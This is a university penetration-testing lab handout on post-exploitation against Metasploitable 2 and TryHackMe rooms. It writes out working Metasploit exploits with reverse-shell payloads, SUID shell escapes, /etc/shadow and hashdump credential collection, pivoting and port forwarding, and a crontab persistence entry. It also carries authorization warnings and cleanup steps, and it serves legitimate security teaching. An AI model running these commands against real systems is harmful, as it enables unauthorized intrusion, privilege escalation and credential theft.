# Lab Activity: Module 08 — Post-Exploitation and Lateral Movement

## Course: CIS-4333 Penetration Testing

## Texas Wesleyan University | Professor Nash

## Certification Alignment: CompTIA PenTest+ (PT0-002)

---

## Authorization and Legal Notice

> **REQUIRED BEFORE STARTING:** All post-exploitation activities in this lab occur EXCLUSIVELY against Metasploitable 2 in your isolated local VM network or the TryHackMe rooms specified below. Privilege escalation, credential dumping, and persistence techniques on unauthorized systems are felonies under 18 U.S.C. § 1030. The techniques in this lab are intentionally powerful — they must never be applied outside this controlled, pre-authorized environment. If any doubt exists about the authorization status of a target, STOP and contact Professor Nash before proceeding. All persistence mechanisms created during this lab must be documented and removed before lab submission.

---

## Lab Overview

In this lab you will start from a low-privileged shell on Metasploitable 2 and work through the full post-exploitation chain: privilege escalation via SUID binaries, credential collection, and pivoting concepts using Meterpreter. You will also complete a TryHackMe room focused on privilege escalation.

**Estimated Time:** 2.5–3 hours

**Authorized Lab Targets:**

- Metasploitable 2 VM — your local isolated host-only network
- TryHackMe room: "Linux PrivEsc" — [https://tryhackme.com/room/linuxprivesc](https://tryhackme.com/room/linuxprivesc)
- TryHackMe room: "Windows PrivEsc" — [https://tryhackme.com/room/windows10privesc](https://tryhackme.com/room/windows10privesc)

**Required Setup:**

- Kali Linux VM with Metasploit, LinPEAS, and enum4linux installed
- Metasploitable 2 VM running on isolated host-only network
- Active TryHackMe account with VPN connected for TryHackMe rooms

---

## Part 1 — Establish Initial Shell on Metasploitable (20 minutes)

### Step 1.1 — Exploit vsftpd 2.3.4 (Review from Module 07)

Use the vsftpd backdoor exploit to get an initial shell:

```bash
msfconsole
```

```text
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(vsftpd_234_backdoor) > set RHOSTS METASPLOITABLE_IP
msf6 exploit(vsftpd_234_backdoor) > run
```

Confirm you have a shell and check your user context:

```bash
id
whoami
```

Record: What user are you running as? Is this root? If it is already root, proceed to Part 2 using a different initial access method.

### Step 1.2 — Alternative Initial Shell (Distcc)

If you want a non-root starting point for privilege escalation practice:

```text
msf6 > use exploit/unix/misc/distcc_exec
msf6 exploit(distcc_exec) > set RHOSTS METASPLOITABLE_IP
msf6 exploit(distcc_exec) > set PAYLOAD cmd/unix/reverse
msf6 exploit(distcc_exec) > set LHOST YOUR_KALI_IP
msf6 exploit(distcc_exec) > run
```

Check the user context after this shell:

```bash
id
```

Record: this should return `uid=1(daemon)` or similar — a low-privileged service account. This is the starting point for privilege escalation.

---

## Part 2 — Linux Privilege Escalation via SUID Binaries (40 minutes)

### Step 2.1 — System Enumeration

From your low-privileged shell, enumerate the system:

```bash
uname -a
cat /etc/os-release
cat /etc/passwd | grep -v "nologin\|false"
id
sudo -l
```

Record: kernel version, OS version, and what sudo permissions (if any) are available.

### Step 2.2 — SUID Binary Discovery

```bash
find / -perm -4000 -type f 2>/dev/null
```

This returns all files with the SUID bit set. Record the full list.

Identify which of these binaries appears in GTFOBins as exploitable with SUID. Key ones to look for on Metasploitable:

- `/usr/bin/find`
- `/usr/bin/python`
- `/usr/bin/perl`
- `/bin/dash`
- `/usr/bin/vim`

### Step 2.3 — Exploit a SUID Binary

For `/usr/bin/find` with SUID (if present):

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

For `/usr/bin/python` with SUID (if present):

```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

After running the appropriate command, verify your elevated context:

```bash
id
whoami
```

Take a screenshot showing the privilege escalation — from `daemon` or other low-privileged user to `root` (uid=0).

### Step 2.4 — Post-Escalation Credential Collection

With root access, collect credentials:

```bash
cat /etc/shadow
cat /etc/passwd
```

Record: How many user accounts have password hashes in `/etc/shadow`? What is the hash format?

---

## Part 3 — Meterpreter Post-Exploitation (40 minutes)

### Step 3.1 — Establish Meterpreter Session

Return to msfconsole and exploit Samba for a Meterpreter session (as in Module 07 lab):

```text
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(usermap_script) > set RHOSTS METASPLOITABLE_IP
msf6 exploit(usermap_script) > set PAYLOAD cmd/unix/reverse
msf6 exploit(usermap_script) > set LHOST YOUR_KALI_IP
msf6 exploit(usermap_script) > run
```

Background the session and upgrade it:

```text
sessions -u 1
sessions -i 2
```

### Step 3.2 — Post-Exploitation Enumeration Modules

From the Meterpreter session:

```text
meterpreter > sysinfo
meterpreter > getuid
meterpreter > run post/linux/gather/hashdump
meterpreter > run post/multi/recon/local_exploit_suggester
```

Record the output of each command. What does `local_exploit_suggester` recommend for this target?

### Step 3.3 — Pivoting Setup

From the Meterpreter session, practice the autoroute configuration. Identify the network interfaces:

```text
meterpreter > ipconfig
```

Add a route for any additional network discovered:

```text
meterpreter > run autoroute -s DISCOVERED_SUBNET/24
meterpreter > run autoroute -p
meterpreter > background
```

In your lab notes, explain: if the Metasploitable VM had a second network interface reaching a `172.16.X.0/24` network, how would autoroute and proxychains enable you to scan that subnet?

### Step 3.4 — Port Forwarding

Practice port forwarding from Meterpreter:

```text
meterpreter > portfwd add -l 8080 -p 80 -r 127.0.0.1
```

This forwards your local port 8080 to the target's localhost port 80. Open a browser on Kali and visit `http://127.0.0.1:8080`. Take a screenshot showing the forwarded web page.

---

## Part 4 — TryHackMe Privilege Escalation Room (30 minutes)

Complete the TryHackMe "Linux PrivEsc" room. This dedicated room provides a pre-configured vulnerable Linux machine with multiple privilege escalation vectors to practice.

Work through at least the following sections:

- SUID/SGID Files
- Sudo Shell Escapes
- Cron Jobs

For each technique completed, record:

- The specific technique
- The command used to identify the vulnerability
- The command used to exploit it
- The resulting access level

Take a screenshot of your TryHackMe room progress showing completed tasks.

---

## Part 5 — Persistence and Cleanup (20 minutes)

### Step 5.1 — Create a Persistence Entry (Metasploitable Only)

On the Metasploitable target (with root shell), add a cron job for persistence demonstration:

```bash
# Add a cron entry as root (for demonstration only — MUST be removed)
echo "# POST-EXPLOIT-DEMO: CIS4333 Lab persistence test" >> /etc/crontab
echo "* * * * * root echo 'persistence_test' >> /tmp/pentest_demo.txt" >> /etc/crontab
```

Record: the exact entry added, timestamp, and target.

### Step 5.2 — Verify and Remove the Persistence Entry

Verify the cron entry was added:

```bash
tail -5 /etc/crontab
```

Now remove it:

```bash
# Remove the last two lines added
head -n -2 /etc/crontab > /tmp/crontab_clean && mv /tmp/crontab_clean /etc/crontab
tail -5 /etc/crontab
```

Verify the entry is removed. Take a screenshot showing the before and after state.

In your lab notes, document the complete persistence lifecycle: what was created, when, and confirmation of removal.

---

## Deliverables

Submit to Canvas:

1. **SUID escalation screenshot** — showing `id` before and after privilege escalation
2. **`/etc/shadow` excerpt** — showing at least three password hash entries from root shell
3. **Meterpreter post-module output** — `local_exploit_suggester` results screenshot
4. **Pivoting explanation** — written explanation (100 words) of autoroute + proxychains workflow
5. **TryHackMe progress screenshot** — showing completed privilege escalation tasks
6. **Persistence documentation** — before/after crontab screenshots and written removal record
7. **Post-exploitation chain summary** — 200–300 words describing the complete attack chain from initial shell to root, and what a real attacker could achieve at each stage

---

## Grading Rubric

| Component | Points | Criteria |
|-----------|--------|---------|
| SUID escalation | 15 | Screenshot showing uid before and after |
| Shadow file access | 10 | Screenshot of hashes from root context |
| Meterpreter modules | 15 | All four commands run, output recorded |
| Pivoting explanation | 10 | Accurate description of autoroute + proxychains |
| TryHackMe room | 20 | Progress screenshot, three techniques documented |
| Persistence lifecycle | 15 | Created, documented, and removed correctly |
| Attack chain summary | 15 | 200–300 words, specific and professional |
| **Total** | **100** | |

---

## Troubleshooting

**SUID find binary not on Metasploitable:**
Try `/usr/bin/nmap` with SUID (older Metasploitable versions): `nmap --interactive` then `!sh`.

**Meterpreter session crashes on upgrade:**
Use `sessions -u 1` from msfconsole. If it fails, try `use post/multi/manage/shell_to_meterpreter` manually.

**autoroute shows no additional networks:**
This is expected if Metasploitable has only one network interface. The pivoting configuration exercise still demonstrates correct syntax — record the command and explain what would happen if a second interface were present.

**TryHackMe VPN drops:**
Reconnect with `sudo openvpn username.ovpn`. TryHackMe machines time out after approximately 1–2 hours; extend the time or restart the machine if it stops responding.

---

---

## Part 9 — Challenge Exercise

### Challenge 1: Privilege Escalation Path Documentation

On your authorized Metasploitable 2 target (or a TryHackMe privilege escalation room machine), enumerate all available privilege escalation vectors using at least three different enumeration methods: manual SUID search (`find / -perm -4000 2>/dev/null`), sudo permissions (`sudo -l`), and world-writable cron jobs (`ls -la /etc/cron* /var/spool/cron/`). For each vector you discover, create a structured entry documenting: the vector name and category (SUID, sudo misconfiguration, weak permissions, etc.), the exact command that reveals the vulnerability, the exploitation command or steps, the privilege level obtained, the ATT&CK technique identifier (from TA0004 Privilege Escalation), and the remediation recommendation. Format your entries as a table. This exercise practices the systematic enumeration approach that produces comprehensive privilege escalation findings in real engagements.

### Challenge 2: Post-Exploitation Impact Chain

After achieving root/SYSTEM access on your authorized target, document a complete post-exploitation impact chain demonstrating what a real attacker could accomplish. Your chain must include at minimum: credential collection (reading `/etc/shadow` or dumping hashes), identification of at least one lateral movement opportunity (another host reachable from the compromised system), one persistence mechanism installed AND removed (with before/after screenshots confirming cleanup), and a data discovery step (identifying what sensitive files or directories are accessible from the root context). Write a 250-word narrative framing this chain as it would appear in the "Attack Narrative" section of a professional penetration test report — describing each step in terms of business impact rather than technical jargon.

### Reflection Questions

1. Your escalation from a low-privileged web shell to root took three steps: SUID Python exploitation, reading `/etc/shadow`, and finding a cron job with a writable script path. Map each step to its corresponding MITRE ATT&CK tactic and technique ID. Then explain why understanding ATT&CK mappings improves the quality of your penetration test report — specifically how it helps the client's defensive security team prioritize remediation and detect similar attacks in the future.

2. A client's security team asks you to leave your persistence mechanism in place for an additional two weeks after the engagement end date so they can "test their detection capabilities." Using the legal and professional framework from Modules 01 and 02, explain why you must decline this request, what risks it creates for you personally, and what the correct process is for the client to authorize an extended access exercise.

**Proprietary and Confidential. Not for disclosure outside of Texas Wesleyan University course use.**
